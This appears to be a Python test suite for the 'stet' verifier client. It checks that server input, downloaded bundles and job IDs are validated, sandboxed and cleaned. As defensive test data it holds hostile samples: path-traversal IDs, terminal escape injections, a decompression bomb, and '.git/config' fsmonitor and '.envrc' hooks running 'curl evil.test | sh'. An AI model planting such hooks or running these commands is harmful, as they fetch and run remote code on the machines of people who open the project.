"""The parts of the client that stand between a verifier's GPU time and the leaderboard."""

import json
import os

import pytest
import zstandard

from stet import client

REAL_SLIM_RESULT = client.slim_result  # the `loop` fixture below stands in for it


def test_a_downloaded_script_is_decompressed_up_to_the_limit_and_no_further():
    raw = os.urandom(997) * 3000  # ~3 MB that compresses to almost nothing
    blob = zstandard.ZstdCompressor(level=10).compress(raw)
    assert len(blob) < 10_000
    assert client.unzstd(blob, len(raw)) == raw
    assert len(client.unzstd(blob, 1000)) == 1001  # one byte over: enough to know it is too big
    with pytest.raises(zstandard.ZstdError):
        client.unzstd(b"not zstd at all", 1000)


def test_a_result_is_reported_again_while_the_server_is_away(monkeypatch):
    calls = []
    answers = [client.ApiError(503, "try again"), client.ApiError(0, "cannot reach"), {"status": "settled"}]

    def fake_request(method, path, body=None, key=None, raw=False, timeout=120):
        calls.append(path)
        a = answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a

    monkeypatch.setattr(client, "request", fake_request)
    monkeypatch.setattr(client.time, "sleep", lambda s: None)
    assert client.report("/api/v1/jobs/7/result", {"x": 1}, key=None) == {"status": "settled"}
    assert calls == ["/api/v1/jobs/7/result"] * 3


def test_a_report_that_landed_before_the_error_is_not_an_error(monkeypatch):
    answers = [client.ApiError(503, "try again"), client.ApiError(409, "this job was already done")]
    monkeypatch.setattr(client, "request", lambda *a, **k: (_ for _ in ()).throw(answers.pop(0)))
    monkeypatch.setattr(client.time, "sleep", lambda s: None)
    assert client.report("/api/v1/jobs/7/result", {}, key=None) == {"status": "recorded"}
    # Only "done" means it landed. A refusal heard on the second try is still a refusal,
    # and so is anything else the server has to say about a job that is over.
    for said in ("this job was already refused", "this job was already released", "this entry already has that grade", "this entry has already been edited"):
        answers[:] = [client.ApiError(503, "try again"), client.ApiError(409, said)]
        with pytest.raises(client.ApiError, match=said):
            client.report("/api/v1/jobs/7/result", {}, key=None)


def test_a_refused_report_is_not_retried(monkeypatch):
    answers = [client.ApiError(409, "your baseline differs")]
    monkeypatch.setattr(client, "request", lambda *a, **k: (_ for _ in ()).throw(answers.pop(0)))
    with pytest.raises(client.ApiError):
        client.report("/api/v1/jobs/7/result", {}, key=None)
    assert not answers


# --- what the server says is not taken on trust ---------------------------------------------


def test_text_from_the_server_cannot_drive_the_terminal():
    evil = "tidy\x1b]0;owned\x07\x1b[2J\r\n‮gnp.exe \x9b31m"
    assert client.clean(evil) == "tidy ]0;owned  [2J   gnp.exe  31m"
    assert client.clean("café 中文 ok") == "café 中文 ok"  # ordinary text is left alone
    assert len(client.clean("x" * 5000)) == 400
    shown = client.table([[evil, "1"]], ["technique", "n"]) + client.editor_label({"owner": "a\x1b[1m", "name": "b\nc", "version": "1\x07"})
    assert not any(ord(ch) < 32 and ch != "\n" or 127 <= ord(ch) < 160 for ch in shown) and shown.count("\n") == 2


class FakeResponse:
    """A server that sends as much as it is asked for, for ever."""

    def __init__(self, body: bytes | None = None):
        self.body, self.asked = body, []

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self, n=-1):
        self.asked.append(n)
        return self.body if self.body is not None else b"x" * n


def test_an_answer_cut_short_is_asked_for_again_not_taken_for_the_whole(monkeypatch):
    # A connection that closes early hands over what had arrived and raises nothing. The
    # caller would take a truncated script for the wrong bytes and hand its job back.
    short = FakeResponse(b"x" * 1000)
    short.headers = {"Content-Length": "5000"}
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=0: short)
    with pytest.raises(client.ApiError, match="cut short") as e:
        client.request("GET", "/api/v1/scripts/" + "ab" * 32, raw=True, limit=1 << 20)
    assert e.value.status == 0 and not isinstance(e.value, client.WrongBytes)  # status 0: retried like any lost connection
    whole = FakeResponse(b"x" * 1000)
    whole.headers = {"Content-Length": "1000"}
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=0: whole)
    assert client.request("GET", "/api/v1/scripts/" + "ab" * 32, raw=True, limit=1 << 20) == b"x" * 1000


def test_an_answer_is_read_up_to_its_limit_and_no_further(monkeypatch):
    r = FakeResponse()
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: r)
    with pytest.raises(client.ApiError, match="more than"):
        client.request("GET", "/api/v1/leaderboard")
    assert r.asked == [client.JSON_LIMIT_BYTES + 1]  # one read, bounded; never read() to the end
    with pytest.raises(client.ApiError, match="more than"):
        client.request("GET", "/api/v1/editors/x/bundle", raw=True, limit=1000)
    assert r.asked[-1] == 1001
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: FakeResponse(b"<html>a proxy's error page"))
    with pytest.raises(client.ApiError, match="not JSON"):
        client.request("GET", "/api/v1/season")
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: FakeResponse(b'{"ok": 1}'))
    assert client.request("GET", "/api/v1/season") == {"ok": 1}


SHA = "ab" * 32


def a_job(**over):
    job = {"id": 7, "kind": "grade", "round": {"id": "s1-o00001"}, "editor": {"id": SHA, "name": "tidy", "version": 1}, "script": {"sha256": SHA}}
    return {**job, **over}


@pytest.mark.parametrize(
    "bad",
    [
        {"id": "../../../../home/victim"}, {"id": "/home/victim"}, {"id": "7"}, {"id": True}, {"id": 7.0}, {"id": -1}, {"id": None},
        {"kind": "shell"}, {"round": "s1-o00001"}, {"editor": None}, {"script": {"sha256": "../" + SHA}}, {"script": {"sha256": SHA.upper()}},
        {"kind": "edit", "editor": {"id": SHA + "/../x"}}, {"kind": "edit", "editor": {"id": 5}},
    ],
)  # fmt: skip
def test_a_job_is_checked_before_any_of_it_reaches_a_path(bad):
    assert client.check_job(a_job()) == 7 and client.check_job(a_job(kind="edit", script=None)) == 7
    with pytest.raises(ValueError):
        client.check_job(a_job(**bad))
    with pytest.raises(ValueError):
        client.check_job([bad])


@pytest.mark.skipif(os.name == "nt", reason="needs flock")
def test_each_verifier_works_in_a_directory_of_its_own():
    from stet.data import cache_dir

    old = cache_dir() / "verify" / "1234" / "bundle"  # how releases before this one named their work
    old.mkdir(parents=True)
    a, lock_a = client.claim_workdir()
    b, lock_b = client.claim_workdir()  # a second verifier on the same machine
    assert a != b and not old.parent.exists()
    assert a.parent == b.parent == cache_dir() / "verify"
    (a / "job").mkdir(parents=True)
    lock_b.close()
    c, lock_c = client.claim_workdir()
    assert c == b and (a / "job").exists()  # a slot is taken up again only once its holder is gone
    lock_a.close()
    lock_c.close()


# --- the verify loop -------------------------------------------------------------------------


class Stop(Exception):
    pass


FAST_MACHINE = {"gpu": "Test GPU", "gpu_tokens_per_second": 500_000, "cpu_mb_per_second": 500, "cores": 16, "memory_gb": 64, "gpu_memory_gb": 24, "disk_gb": 500, "at": 0}


class Args:
    once = False
    max_jobs = 0
    device = "cpu"
    season = "s1"
    edits = False
    no_sandbox = False
    any_device = True


@pytest.fixture
def loop(monkeypatch):
    """`stet verify` with the server, the GPU and the clock replaced. Returns what happened."""
    import sys
    import types

    from stet import bench, cli, env

    # This machine, as far as `stet verify` can tell, has the season's libraries and is fast
    # enough to run curators. The tests of those checks say otherwise where they need to.
    monkeypatch.setattr(env, "problems", lambda *a, **k: [])
    monkeypatch.setattr(bench, "saved", lambda *a, **k: FAST_MACHINE)
    monkeypatch.setattr(bench, "measure", lambda *a, **k: pytest.fail("the machine's speed was measured in a test"))

    key = client.create_key()
    key.handle = "tester"
    key.save()
    seen = types.SimpleNamespace(claims=[], released=[], reports=[], payloads=[], graded=[], slept=[], forgot=[], interrupt_at=None)

    def interrupt():
        raise KeyboardInterrupt

    seen.interrupt = interrupt

    seen.me = {"account": {"handle": "tester"}, "verifier": {"validated": 0}}

    def request(method, path, body=None, key=None, raw=False, timeout=120, limit=0):
        if path == "/api/v1/season":
            return {"scale": "nano"}
        if path == "/api/v1/me":
            return seen.me
        if path == "/api/v1/jobs/claim":
            if not seen.claims:
                raise Stop
            return {"job": seen.claims.pop(0), **({"runner": seen.runner.pop(0)} if getattr(seen, "runner", None) else {})}
        if path.endswith("/release"):
            seen.released.append((path, body["reason"]))
            return {}
        raise AssertionError(f"unexpected request: {method} {path}")

    def grade(job, season, scale, device, key, out, work):
        seen.graded.append(job["id"])
        outcome = seen.grade.pop(0) if isinstance(seen.grade, list) else seen.grade  # a list: one outcome per try
        if isinstance(outcome, Exception):
            raise outcome
        return outcome or ({"valid": False, "invalid_reason": "bad\x1b[2J script"}, {})

    def sleep(seconds):
        seen.slept.append(seconds)
        if seconds == seen.interrupt_at:
            seen.interrupt()

    def report(path, payload, key, log=None):
        seen.reports.append(path)
        seen.payloads.append(payload)
        if isinstance(seen.report, Exception):
            raise seen.report
        return seen.report

    seen.grade = seen.report = None
    monkeypatch.setitem(sys.modules, "stet.train", types.SimpleNamespace(pick_device=lambda d: types.SimpleNamespace(type="cpu"), hardware_info=lambda d: {}))
    monkeypatch.setattr(cli, "need_torch", lambda: None)
    monkeypatch.setattr(client, "request", request)
    monkeypatch.setattr(client, "report", report)
    monkeypatch.setattr(client, "_grade_job", grade)
    monkeypatch.setattr(client, "_edit_job", lambda *a, **k: pytest.fail("an edit job was run"))
    monkeypatch.setattr(client, "slim_result", lambda result, base: {})
    monkeypatch.setattr(client, "_forget_round", lambda job, season, scale: seen.forgot.append(job["round"]["id"]))
    monkeypatch.setattr(client.time, "sleep", sleep)
    return seen


def test_a_verifier_that_was_not_asked_to_run_edits_never_runs_one(loop, capsys):
    loop.claims = [a_job(kind="edit", script=None)]
    with pytest.raises(SystemExit) as e:
        client.cmd_verify(Args())
    assert e.value.code == 1 and loop.released == [("/api/v1/jobs/7/release", "this verifier does not run edit jobs")]
    assert "edit job" in capsys.readouterr().err and not loop.reports


def test_a_job_with_a_path_for_an_id_touches_nothing(loop, tmp_path):
    from stet.data import cache_dir

    victim = tmp_path / "victim"
    victim.mkdir()
    (victim / "thesis.txt").write_text("three years")
    loop.claims = [a_job(id=str(victim)), a_job(id="../../victim")]
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert (victim / "thesis.txt").exists() and not loop.graded and not loop.released
    assert loop.slept == [60, 120]  # it waits, a little longer each time, and asks again
    assert sorted(p.name for p in (cache_dir() / "verify").iterdir()) == ["slot0.lock"]


def test_a_refused_result_is_not_trained_again_and_again(loop, capsys):
    loop.claims = [a_job(id=n) for n in (1, 2, 3, 4)] + [a_job(id=5, round={"id": "s1-o00002"})]
    loop.report = client.ApiError(409, "your corpus for s1-o00001 differs from the round's")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    # Once more from a clean copy of the round, in case this machine's copy was at fault; then no more of that round.
    assert loop.graded == [1, 2, 5] and loop.forgot == ["s1-o00001", "s1-o00002"]
    assert [p for p, _ in loop.released] == [f"/api/v1/jobs/{n}/release" for n in (1, 2, 3, 4, 5)]
    assert "differs from the round's" in capsys.readouterr().err


def test_a_result_that_arrived_too_late_is_nobodys_fault(loop):
    loop.claims = [a_job(id=n) for n in (1, 2, 3)]
    loop.report = client.ApiError(409, "this entry settled before your result arrived. It earns no credit, and it does not count against you")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1, 2, 3] and not loop.forgot


def test_a_job_whose_downloads_fail_is_kept_and_waited_out(loop, capsys):
    from stet.data import FetchError

    # A job handed back is not free: an entry gets a few attempts from the anchors, and a
    # volunteer is offered an entry once. So the job is kept while the network is at fault,
    # and the server gives a verifier the job it already holds each time it asks.
    loop.claims = [a_job(id=1)] * 7 + [a_job(id=2)]
    loop.grade = FetchError("could not fetch crawl-data/x.warc.wet.gz: timed out")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1] * 7 + [2]
    # A job is kept for half an hour and not a second longer (60 + 120 + 240 + 480 + 900 s):
    # the server stops waiting for a job it has heard nothing about. Then it goes back, and
    # the wait that follows holds nothing. Handed the same job again, it is kept for half an
    # hour again; a job it has not seen before starts with a short wait.
    assert loop.slept == [60, 120, 240, 480, 900, 1920, 1800, 60]
    # The loop ends here with job 2 still kept (the test's server goes away), and a
    # volunteer hands back whatever it holds on the way out.
    assert loop.released == [("/api/v1/jobs/1/release", "FetchError: could not fetch crawl-data/x.warc.wet.gz: timed out"), ("/api/v1/jobs/2/release", "the verifier stopped")]
    assert "Keeping the job" in capsys.readouterr().err

    # What will be the same next time is handed back at once: bytes that are not what
    # their hash says, or a server that says no.
    for n, final in enumerate((client.WrongBytes("the script the server sent does not match its hash"), client.ApiError(404, "no such script")), 10):
        loop.claims, loop.grade = [a_job(id=n)], final
        with pytest.raises(Stop):
            client.cmd_verify(Args())
        assert loop.released[-1][0] == f"/api/v1/jobs/{n}/release"
    assert len(loop.released) == 4  # each once

    # A verifier asked to do one job does not sit on it.
    loop.claims, loop.grade = [a_job(id=20)], FetchError("timed out")
    args = Args()
    args.once = True
    before = len(loop.released)
    with pytest.raises(SystemExit):
        client.cmd_verify(args)
    assert [p for p, _ in loop.released[before:]] == ["/api/v1/jobs/20/release"]  # once, not once more on the way out


def test_a_job_that_fails_here_is_tried_again_before_it_is_handed_back(loop, capsys):
    # A fault that passes costs a minute, and none of the entry's attempts.
    loop.claims = [a_job(id=1), a_job(id=1)]
    loop.grade = [OSError(28, "No space left on device"), None]
    loop.report = {"status": "recorded"}
    args = Args()
    args.max_jobs = 1
    client.cmd_verify(args)
    assert loop.graded == [1, 1] and loop.slept == [60] and not loop.released and loop.reports == ["/api/v1/jobs/1/result"]
    assert "keeping it and trying again in 1 min" in capsys.readouterr().err

    # One that stays: each job is tried three times, over six minutes, before it goes
    # back. Three jobs of that and it is this machine, not the jobs.
    for seen in (loop.graded, loop.slept, loop.reports):
        seen.clear()
    loop.claims = [a_job(id=n) for n in (1, 1, 1, 2, 2, 2, 3, 3, 3, 4)]
    loop.grade = RuntimeError("CUDA error: device lost")
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert loop.graded == [1, 1, 1, 2, 2, 2, 3, 3, 3] and loop.slept == [60, 300, 30, 60, 300, 30, 60, 300]
    assert [p for p, _ in loop.released] == [f"/api/v1/jobs/{n}/release" for n in (1, 2, 3)] and "device lost" in loop.released[0][1]
    assert "keep failing on this machine" in capsys.readouterr().err and not loop.reports


def test_stopping_between_two_tries_at_a_job_hands_it_back(loop, capsys):
    loop.claims = [a_job(id=5)]
    loop.grade = RuntimeError("CUDA error: device lost")
    loop.interrupt_at = 60  # Ctrl-C while it waits to try again
    client.cmd_verify(Args())
    assert loop.released == [("/api/v1/jobs/5/release", "interrupted")] and "handed back" in capsys.readouterr().err
    # With no job in hand there is nothing to hand back, and the interrupt is the caller's.
    loop.claims, loop.grade, loop.interrupt_at = [{"id": "not a job"}], None, 60
    with pytest.raises(KeyboardInterrupt):
        client.cmd_verify(Args())
    assert len(loop.released) == 1


@pytest.mark.skipif(os.name == "nt", reason="POSIX signals")
def test_a_volunteer_told_to_stop_hands_its_job_back_as_on_ctrl_c(loop, capsys):
    import signal

    # A closed terminal or a service manager says SIGHUP or SIGTERM, not Ctrl-C. A job left
    # behind by either would hold its place until its time ran out.
    before = signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)
    for n, sig in ((5, signal.SIGTERM), (6, signal.SIGHUP)):
        loop.claims, loop.grade, loop.interrupt_at = [a_job(id=n)], RuntimeError("CUDA error: device lost"), 60
        loop.interrupt = lambda sig=sig: os.kill(os.getpid(), sig)
        client.cmd_verify(Args())
        assert loop.released[-1] == (f"/api/v1/jobs/{n}/release", "interrupted") and "handed back" in capsys.readouterr().err
    assert (signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)) == before  # and the process is left as it was found


@pytest.mark.skipif(os.name == "nt", reason="needs flock")
def test_one_key_runs_one_verifier(loop, capsys):
    held = client.claim_key()
    with pytest.raises(SystemExit):
        client.claim_key()
    err = capsys.readouterr().err
    assert f"process {os.getpid()}" in err and "STET_CONFIG=<another directory> stet login --handle" in err
    # The server would hand a second verifier on this key the first one's job. It does not get as far as asking.
    loop.claims = [a_job()]
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert not loop.graded and len(loop.claims) == 1
    held.close()
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [7]
    client.claim_key().close()  # and a verifier that has stopped leaves the key free


def test_what_a_grade_prints_is_cleaned_and_counted(loop, capsys):
    loop.claims = [a_job()]
    loop.report = {"status": "recorded\x1b[31m", "message": "thanks\x07"}
    args = Args()
    args.max_jobs = 1
    client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "\x1b[2J" not in err and "\x07" not in err and "recorded" in err and loop.reports == ["/api/v1/jobs/7/result"]


# --- edit jobs -------------------------------------------------------------------------------


@pytest.fixture
def edit(monkeypatch, tmp_path):
    """An edit job up to the point where the curator would start."""
    import hashlib
    import types

    from stet import cli, data
    from stet.spec import load_season

    season = load_season("s1")
    state = types.SimpleNamespace(blob=b"")
    monkeypatch.setattr(client, "request", lambda *a, **k: state.blob)
    monkeypatch.setattr(client, "_job_round", lambda season, job, out: types.SimpleNamespace(id="s1-o00001"))
    monkeypatch.setattr(data, "corpus", lambda rnd, scale: types.SimpleNamespace(meta={"sha256": "c0"}))

    def run(blob: bytes, sandbox: str = "bwrap", editor_id: str | None = None):
        state.blob = blob
        job = a_job(kind="edit", script=None, editor={"id": editor_id or hashlib.sha256(blob).hexdigest()})
        return client._edit_job(job, season, season.scale("nano"), None, cli.Out(quiet=True), tmp_path / "work", sandbox)

    return run


def test_an_editor_never_runs_outside_the_sandbox(edit, monkeypatch):
    from stet.runner import HarnessError

    monkeypatch.setattr(client, "request", lambda *a, **k: pytest.fail("fetched a bundle it must not run"))
    for sandbox in ("none", "", "docker"):
        with pytest.raises(HarnessError, match="outside the sandbox"):
            edit(b"x", sandbox=sandbox)


def test_both_sandboxes_run_an_editor_with_the_machine_it_is_promised(edit, monkeypatch):
    import sys
    import types

    from test_project import bundle

    from stet.runner import EditRun

    seen = []

    def edit_round(bundle_dir, entry, rnd, scale, work, sandbox="none", limits=None, **kw):
        seen.append((sandbox, (limits or {}).get("required")))
        return EditRun("no_script", 1.0, 60.0, 0, None, "", sandbox, "nothing written")

    # The pipeline itself trains, with PyTorch, which the harness's tests run without.
    monkeypatch.setitem(sys.modules, "stet.pipeline", types.SimpleNamespace(edit_round=edit_round))
    blob = bundle([("stet.toml", b'name = "probe"\nentry = "python curator.py"\n'), ("curator.py", b"")])
    for sandbox in ("bwrap", "container"):
        payload = edit(blob, sandbox=sandbox)
        assert payload["edit"]["sandbox"] == sandbox and payload["edit"]["status"] == "no_script"
    # Held to the promised memory and GPU in both: an official run, wherever it is made.
    assert seen == [("bwrap", True), ("container", True)]


def test_a_bundle_that_cannot_be_loaded_is_the_entrants_failure_and_is_reported(edit, monkeypatch):
    import zstandard
    from test_project import bundle

    from stet import project

    monkeypatch.setattr(project, "MAX_UNPACKED_BYTES", 1 << 20)
    bomb = zstandard.ZstdCompressor().compress(b"\0" * (8 << 20))
    no_manifest = bundle([("curator.py", b"")])
    bad_manifest = bundle([("stet.toml", b"x = " + b"[" * 5000 + b"]" * 5000)])
    for blob, why in ((b"not a bundle", "zstd"), (bomb, "more than 1 MB"), (no_manifest, "no stet.toml"), (bad_manifest, "not valid TOML")):
        payload = edit(blob)
        assert payload["edit"]["status"] == "error" and why in payload["edit"]["reason"] and payload["script_sha256"] is None
        assert payload["round"] == "s1-o00001" and payload["corpus_sha256"] == "c0"  # a report the server accepts, not a release


def test_a_machine_that_cannot_unpack_a_bundle_hands_the_job_back(edit, monkeypatch):
    import errno

    from stet import project
    from stet.runner import HarnessError

    with pytest.raises(client.ApiError, match="does not match"):
        edit(b"some bundle", editor_id=SHA)

    def full(blob, dest):
        raise OSError(errno.ENOSPC, "No space left on device")

    monkeypatch.setattr(project, "unpack", full)
    with pytest.raises(HarnessError, match="on this machine"):
        edit(b"some bundle")


# --- the record of announcements -------------------------------------------------------------


@pytest.fixture
def draws():
    """A season, a moment, and the next few draws on its grid after that moment."""
    import types

    from stet.spec import load_season

    season = load_season("s1")
    grid = int(season.raw["draw_grid_seconds"])
    now = 1_900_000_000 // grid * grid + 100
    slots = [season.beacon_round_at((now // grid + n) * grid) for n in (1, 2, 3)]
    assert all(season.draw_slot(s) is not None for s in slots)

    def said(slot, crawl="CC-MAIN-2026-40", id="s1-o00009"):
        return {"id": id, "drand_round": slot, "crawl": {"crawl": crawl, "paths_sha256": "66" * 32}}

    def drawn(slot, crawl="CC-MAIN-2026-40", id="s1-o00009"):
        return types.SimpleNamespace(kind="official", id=id, beacon={"round": slot}, crawl={"crawl": crawl, "paths_sha256": "66" * 32})

    return types.SimpleNamespace(season=season, now=now, slots=slots, said=said, drawn=drawn, log=lambda: json.loads(client._announcements().read_text()))


def test_a_round_must_be_the_one_that_was_announced_before_its_beacon(draws):
    season, now, slot = draws.season, draws.now, draws.slots[0]
    at = season.beacon_time(slot)
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-39"), now=now)
    client.remember_announcement(season, draws.said(slot), now=now + 60)  # the server may change its mind before the beacon exists
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-41"), now=at - 5)  # and not once it all but does
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-41"), now=at + 5)
    assert draws.log()[str(slot)]["crawl"] == "CC-MAIN-2026-40" and draws.log()[str(slot)]["changed"] == 1
    client.check_announcement(season, draws.drawn(slot))
    for other in (draws.drawn(slot, "CC-MAIN-2026-41"), draws.drawn(slot, id="s1-o00010")):
        with pytest.raises(client.RoundRefused, match="was announced as s1-o00009 on CC-MAIN-2026-40"):
            client.check_announcement(season, other)


def test_the_server_gets_no_say_in_what_the_record_holds(draws):
    season, now, slot = draws.season, draws.now, draws.slots[0]
    client.remember_announcement(season, draws.said(slot), now=now)
    grid = int(season.raw["draw_grid_seconds"])
    far = season.beacon_round_at((now // grid + 5000) * grid)
    junk = [draws.said(slot + 1), draws.said(far), draws.said(draws.slots[1], crawl="../../x"), {"drand_round": "x"}, {"id": "y"}, None, "z"]
    junk += [draws.said(far + n * 1000) for n in range(500)]  # nothing here can crowd out what is already written down
    for a in junk:
        client.remember_announcement(season, a, now=now)
    assert list(draws.log()) == [str(slot)]
    # Entries leave by age, and for no other reason.
    later = now + 31 * 86400
    new = season.beacon_round_at((later // grid + 1) * grid)
    client.remember_announcement(season, draws.said(new), now=later)
    assert list(draws.log()) == [str(new)]
    assert not list(client._announcements().parent.glob("*.tmp*"))


def test_a_draw_nobody_announced_is_said_out_loud(draws):
    season, now = draws.season, draws.now
    said = []
    client.check_announcement(season, draws.drawn(draws.slots[1]), warn=said.append)
    assert not said  # this verifier has heard of no draws at all: it has nothing to go on, and says nothing
    client.remember_announcement(season, draws.said(draws.slots[0]), now=now)
    client.check_announcement(season, draws.drawn(draws.slots[1], id="s1-o00010"), warn=said.append)
    assert len(said) == 1 and "was not told of the draw of round s1-o00010" in said[0] and "s1-o00009" in said[0]
    client.check_announcement(season, draws.drawn(draws.slots[0]), warn=said.append)
    assert len(said) == 1
    # The round it was told of, drawn at another time: say that, not "the last it heard of was this one".
    client.check_announcement(season, draws.drawn(draws.slots[1], id="s1-o00009"), warn=said.append)
    assert len(said) == 2 and "was told that round s1-o00009 would be drawn at" in said[1] and "cannot vouch" in said[1]


def test_a_damaged_record_is_set_aside_not_forgotten(draws, capsys):
    path = client._announcements()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text('{"123": {"id": "s1-o0')
    client.remember_announcement(draws.season, draws.said(draws.slots[0]), now=draws.now)
    assert path.with_name("announced.json.damaged").read_text() == '{"123": {"id": "s1-o0'
    assert list(draws.log()) == [str(draws.slots[0])] and "could not be read" in capsys.readouterr().err


# --- fork and submit -------------------------------------------------------------------------


class ForkArgs:
    def __init__(self, editor, dest=None):
        self.editor, self.dest = editor, dest


def serve(monkeypatch, blob: bytes, **over):
    import hashlib

    editor = {"id": hashlib.sha256(blob).hexdigest(), "name": "tidy", "owner": "ann", "version": 2, **over}
    monkeypatch.setattr(client, "request", lambda method, path, **k: blob if path.endswith("/bundle") else {"editor": editor})
    return editor


def test_fork_does_not_let_the_server_choose_where_files_go(monkeypatch, tmp_path):
    from test_project import bundle

    monkeypatch.chdir(tmp_path)
    blob = bundle([("stet.toml", b'name = "tidy"\nentry = "python curator.py"\n'), ("curator.py", b"")])
    for over in ({"name": "../../evil"}, {"name": "/tmp/evil"}, {"name": ".ssh"}, {"name": None}, {"id": "../x"}, {"id": SHA}):
        serve(monkeypatch, blob, **over)
        with pytest.raises(SystemExit):
            client.cmd_fork(ForkArgs("ann/tidy"))
    editor = serve(monkeypatch, blob)
    with pytest.raises(SystemExit):
        client.cmd_fork(ForkArgs("cd" * 32))  # asked for one curator by its id, answered with another
    assert not list(tmp_path.iterdir())
    client.cmd_fork(ForkArgs(editor["id"][:12]))
    assert sorted(p.name for p in (tmp_path / "tidy").iterdir()) == [".gitignore", "AGENTS.md", "curator.py", "stet.toml"]


def test_a_fork_holds_no_hidden_files_and_says_whose_program_it_is(monkeypatch, tmp_path, capsys):
    from test_project import bundle

    monkeypatch.chdir(tmp_path)
    blob = bundle([
        ("stet.toml", b'name = "tidy"\nparent = "x"\nentry = "python curator.py"\n'), ("curator.py", b"print(1)\n"),
        (".git/config", b"[core]\n\tfsmonitor = curl evil.test | sh\n"), (".envrc", b"curl evil.test | sh\n"), (".vscode/tasks.json", b"{}"),
    ])  # fmt: skip
    editor = serve(monkeypatch, blob)
    client.cmd_fork(ForkArgs("ann/tidy", dest="mine"))
    assert sorted(p.name for p in (tmp_path / "mine").iterdir()) == [".gitignore", "AGENTS.md", "curator.py", "stet.toml"]
    assert f'parent = "{editor["id"]}"' in (tmp_path / "mine" / "stet.toml").read_text()
    err = capsys.readouterr().err
    assert "someone else's program" in err and "stet run --sandbox" in err and "Left out 3 files" in err


class SubmitArgs:
    yes = False
    json = False
    dry_run = True

    def __init__(self, path):
        self.path = str(path)


def test_submit_shows_every_file_it_would_publish_before_it_sends_anything(monkeypatch, tmp_path, capsys):
    from test_project import make

    p = make(tmp_path, {".env": "API_KEY=secret", "notes/todo.txt": "x", "venv/bin/python": "x", ".git/HEAD": "x"})
    monkeypatch.setattr(client, "request", lambda *a, **k: pytest.fail("a dry run sent something"))
    client.cmd_submit(SubmitArgs(p.path))  # needs no account
    err = capsys.readouterr().err
    assert "a-curator: 3 files" in err and "Nothing was sent." in err
    for shown in ("curator.py", "notes/todo.txt", "stet.toml", ".env  (its name starts with a dot)", "venv/  (it is under venv/)", ".git/  (its name starts with a dot)"):
        assert shown in err
    assert "secret" not in err
    # A real submission prints the same list before it asks. With no terminal and no --yes, it stops there.
    key = client.create_key()
    key.handle = "tester"
    key.save()
    args = SubmitArgs(p.path)
    args.dry_run = False
    monkeypatch.setattr("sys.stdin", open(os.devnull))
    with pytest.raises(SystemExit):
        client.cmd_submit(args)
    err = capsys.readouterr().err
    assert "notes/todo.txt" in err and ".env  (its name starts with a dot)" in err and "--yes" in err


def test_a_round_that_does_not_hold_up_is_refused_and_a_warning_is_given_once(draws, monkeypatch):
    import types

    from stet import data

    lines = []
    out = types.SimpleNamespace(line=lambda label, text: lines.append(text), bad=str)
    monkeypatch.setattr(data, "mark_verified", lambda rnd: None)
    monkeypatch.setattr(data, "prune_verified", lambda rnd: None)
    monkeypatch.setattr(client, "round_from_api", lambda season, d: draws.drawn(draws.slots[1], id="s1-o00011"))
    client.remember_announcement(draws.season, draws.said(draws.slots[0]), now=draws.now)
    for _ in range(3):  # three jobs from one round
        assert client._job_round(draws.season, {"round": {}}, out).id == "s1-o00011"
    assert len(lines) == 1 and "was not told" in lines[0]

    def lies(season, d):
        raise ValueError("round s1-o00011: the seed does not follow from the beacon and the crawl")

    monkeypatch.setattr(client, "round_from_api", lies)
    with pytest.raises(client.RoundRefused, match="does not follow"):
        client._job_round(draws.season, {"round": {}}, out)


# --- what stops a verifier, and what becomes of the job it holds -----------------------------


def a_beacon(number: int, signature: bytes = b"\x01" * 48) -> dict:
    import hashlib

    return {"round": number, "signature": signature.hex(), "randomness": hashlib.sha256(signature).hexdigest()}


def test_a_relay_that_cannot_be_read_has_said_nothing(monkeypatch):
    from stet.data import FetchError
    from stet.spec import load_season

    season = load_season("s1")
    relays = season.raw["beacon"]["relays"]
    good = a_beacon(1234)
    beacon = {"round": 1234, "randomness": good["randomness"].upper()}
    asked = []

    def serve(*answers):
        answers = list(answers)
        asked.clear()

        def urlopen(req, timeout=0):
            asked.append(req.full_url)
            a = answers.pop(0)
            if isinstance(a, Exception):
                raise a
            return FakeResponse(a if isinstance(a, bytes) else json.dumps(a).encode())

        monkeypatch.setattr(client.urllib.request, "urlopen", urlopen)

    # An error object, a page that is not JSON, a list, a beacon for another round, one whose
    # randomness is not the hash of its signature, a relay that is down: each is that relay
    # having said nothing, and the next one is asked.
    unreadable = [{"error": "internal"}, b"<html>busy</html>", [1, 2], a_beacon(1235), {**good, "randomness": "00" * 32}, {"round": 1234, "randomness": good["randomness"]}, OSError("timed out")]
    for bad in unreadable:
        serve(bad, good)
        client.verify_beacon(season, beacon)
        assert len(asked) == 2 and asked[0].startswith(relays[0]) and asked[1].startswith(relays[1])
    # No relay with anything readable to say is a download that failed, to be waited out.
    # It is not a reason to refuse the round.
    serve(*[{"error": "internal"}] * len(relays))
    with pytest.raises(FetchError, match="no drand relay gave a readable answer") as e:
        client.verify_beacon(season, beacon)
    assert len(asked) == len(relays) and not isinstance(e.value, ValueError)
    # A well-formed beacon that says something else is. It is not put to a vote.
    other = a_beacon(1234, b"\x02" * 48)
    serve({"error": "internal"}, other, good)
    with pytest.raises(ValueError, match="does not match drand round 1234"):
        client.verify_beacon(season, beacon)
    assert len(asked) == 2


class AnchorArgs(Args):
    edits = True
